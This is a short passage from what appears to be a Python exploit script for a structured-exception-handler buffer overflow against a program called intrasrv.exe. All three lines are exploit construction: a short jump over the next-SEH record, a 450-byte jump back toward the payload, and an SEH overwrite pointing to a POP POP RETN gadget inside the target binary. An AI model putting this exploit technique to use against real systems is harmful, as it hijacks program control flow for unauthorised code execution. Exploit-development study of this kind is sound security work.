...
nseh = "\x90\x90\xEB\xF6" # JMP back 10 bytes
jmp450 = "\x90\x90\x90\xE9\x3E\xFE\xFF\xFF" # Have it hit our long jump back 450
seh = pack('<L', 0x004097dd) # our POP POP RETN from intrasrv.exe
